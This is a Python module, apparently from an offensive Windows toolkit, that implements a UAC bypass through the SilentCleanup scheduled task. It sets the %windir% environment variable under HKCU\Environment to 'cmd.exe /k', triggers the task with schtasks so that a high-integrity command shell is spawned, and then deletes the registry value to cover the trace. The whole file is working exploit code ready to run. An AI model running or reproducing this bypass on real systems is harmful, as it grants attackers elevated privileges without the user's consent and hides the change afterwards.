"""
Works from: Windows 8.1 (9600)
Fixed in: 
"""
import os
import time
import _winreg
from core.prints import *

def silentcleanup():
	print """
 -------------------------------------------------------------
 SilentCleanup is a preconfigured scheduled task that is
 vulnerable to enviroment variable hijack.
 
 Read access to HKCU\Environment is performed upon
 execution. Due to the registry key being accessible
 from user mode, an arbitrary executable file can
 be injected. 
 
 When everything worked correctly, the payload should be
 spawned with high IL. Which, in this case will be
 "cmd.exe /k" that will run.
 -------------------------------------------------------------
 """
	print_info("Payload: cmd.exe /k")
	print_info("Hijacking %windir% enviroment variable in HKCU\Environment")
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Environment"))
								
		_winreg.SetValueEx(key,
				"windir",
				0,
				_winreg.REG_SZ,
				"cmd.exe /k")
		_winreg.CloseKey(key)
		print_success("Successfully created %windir% enviroment variable in HKCU\Environment")
	except Exception as error:
		print_error("Unable to create %windir% enviroment variable in HKCU\Environment")
		return False

	print_info("Pausing for 5 seconds before executing")
	time.sleep(5)

	try:
		os.popen("schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I")
		print_success("Successfully ran schtask")
	except Exception as error:
		print_error("Unable to run schtask")
		return False
	
	print_info("Pausing for 5 seconds before cleaning")
	time.sleep(5)

	print_info("Removing %windir% enviroment variable")	
	try:
		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
					"Environment",
					0,
					_winreg.KEY_ALL_ACCESS)
								
		_winreg.DeleteValue(key,
				"windir")
		print_success("Successfully removed %windir% enviroment variable")
	except Exception as error:
		print_error("Unable to remove %windir% enviroment variable")
		return False
